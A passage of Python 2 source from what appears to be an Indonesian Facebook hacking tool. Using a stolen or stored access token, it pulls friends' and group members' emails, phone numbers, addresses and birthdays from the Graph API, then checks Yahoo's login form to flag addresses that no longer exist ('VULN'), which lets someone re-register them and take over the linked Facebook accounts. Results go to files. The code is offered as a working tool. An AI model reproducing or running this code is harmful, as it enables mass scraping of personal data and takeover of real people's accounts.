                print '\x1b[1;96m[?] \x1b[1;93mName\x1b[1;97m          : \x1b[1;91mThere is no'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mID\x1b[1;97m            : ' + z['id']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mID\x1b[1;97m            : \x1b[1;91mThere is no'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mEmail\x1b[1;97m         : ' + z['email']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mEmail\x1b[1;97m         : \x1b[1;91mThere is no'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mNo HP\x1b[1;97m         : ' + z['mobile_phone']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mNumber phone\x1b[1;97m  : \x1b[1;91mThere is no'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mTempat tinggal\x1b[1;97m: ' + z['location']['name']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mAdreess\x1b[1;97m       : \x1b[1;91mThere is no'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mTanggal lahir\x1b[1;97m : ' + z['birthday']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mDate of birth\x1b[1;97m : \x1b[1;91mThere is no'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mSekolah\x1b[1;97m       : '
                for q in z['education']:
                    try:
                        print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                    except KeyError:
                        print '\x1b[1;91m                   ~ \x1b[1;91mThere is no'

            except KeyError:
                pass

            raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
            menu()
    else:
        print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;91mAccount not found'
        raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
        menu()


def yahoo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;97m1.\x1b[1;96m Clone from list friends'
    print '\x1b[1;97m2.\x1b[1;96m Clone from friends'
    print '\x1b[1;97m3.\x1b[1;96m Clone from group member'
    print '\x1b[1;97m4.\x1b[1;96m Clone from file'
    print '\n\x1b[1;91m0.\x1b[1;91m Return'
    clone()


def clone():
    embuh = raw_input('\n\x1b[1;97m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x9f\xa9 ')
    if embuh == '':
        print '\x1b[1;96m[!] \x1b[1;91mKONTOL'
    elif embuh == '1':
        clone_dari_daftar_teman()
    elif embuh == '2':
        clone_dari_teman()
    elif embuh == '3':
        clone_dari_member_group()
    elif embuh == '4':
        clone_dari_file()
    elif embuh == '0':
        menu()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mKONTOL'


def clone_dari_daftar_teman():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mRetrieve email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mName \x1b[1;91m: \x1b[1;92m' + nama + '\n'
                    save = open('out/MailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mEnd \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile Saved \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
    menu()


def clone_dari_teman():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    idt = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter friends ID \x1b[1;91m: \x1b[1;97m')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mName\x1b[1;91m         :\x1b[1;97m ' + op['name']
    except KeyError:
        print '\x1b[1;96m[!] \x1b[1;91mFriends not found'
        raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
        menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mRetrieve email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 43 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mName \x1b[1;91m: \x1b[1;92m' + nama
                    save = open('out/TemanMailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mEnd \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/TemanMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
    menu()


def clone_dari_member_group():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    id = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter group ID \x1b[1;91m:\x1b[1;97m ')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
        asw = json.loads(r.text)
        print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mGroup name     \x1b[1;91m:\x1b[1;97m ' + asw['name']
    except KeyError:
        print '\x1b[1;96m[!] \x1b[1;91mGroup not found'
        raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
        menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mRetrieve email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mName \x1b[1;91m: \x1b[1;92m' + nama
                    save = open('out/GrupMailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/GrupMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
    menu()


def clone_dari_file():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    files = raw_input('\x1b[1;96m[+] \x1b[1;93mFile name \x1b[1;91m: \x1b[1;97m')
    try:
        total = open(files, 'r')
        mail = total.readlines()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mFile not found'
        raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
        menu()

    mpsh = []
    jml = 0
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                save = open('out/MailVuln.txt', 'a')
                save.write('Email: ' + mail + '\n\n')
                save.close()
                berhasil.append(mail)

    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mEnd \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/FileMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
    menu()


if __name__ == '__main__':
    loginSC()
